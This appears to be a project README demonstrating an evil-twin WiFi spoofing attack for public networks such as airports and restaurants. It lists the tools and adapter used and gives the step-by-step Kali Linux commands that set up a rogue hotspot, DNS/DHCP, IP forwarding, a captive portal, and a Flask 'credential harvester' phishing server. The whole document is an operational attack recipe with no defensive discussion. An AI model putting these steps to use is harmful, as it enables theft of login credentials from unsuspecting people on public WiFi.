# Social-Engineering---WiFi-Spoofing-Attack
This is a demonstration of how a WiFi Spoofing / Evil Twin attack on public networks such as in airports and restaurants using a USB WiFi adapter and captive portal.

Technologies Used:

1) Flash Web Server for Hosting Fake Site
2) Hostapd to set up hotspot
3) DNSMasq for setting DNS and DHCP
4) Nodogsplash for setting up Captive Portal 


USB WiFi Adapter used: ALFA AWUS036ACS 802.11ac AC600 Dual Band WiFi USB Adapter

Commands Used on Kali Linux for setup:
sudo ip link set wlan0 down ----------> Set USB adapter interface down

sudo iw dev wlan0 set type __ap ----------> Set adapter to be in access point mode for our hotspot

sudo ip link set wlan0 up ----------> Set USB adapter interface up

sudo ip addr flush dev wlan0 ----------> Clear out any IP address associated to our adapter interface

sudo ip addr add 10.10.0.1/24 dev wlan0 ----------> Add 10.10.0.1 IP address to our USB adapter interface

sudo hostapd hostapd.conf ----------> Start up our WiFi hotspot

sudo dnsmasq -C dnsmasq.conf ----------> Launch our DNS and DHCP server

sudo sysctl -w net.ipv4.ip_forward=1 ----------> Enable IP forwarding for router to forward packets

sudo iptables -P FORWARD ACCEPT ----------> Update Linux kernel firewall to accept forwarding traffic

sudo python3 PhishingServer2.py ----------> Launch our Flask web server with credential harvester

sudo nodogsplash ----------> Launch our captive portal webpage





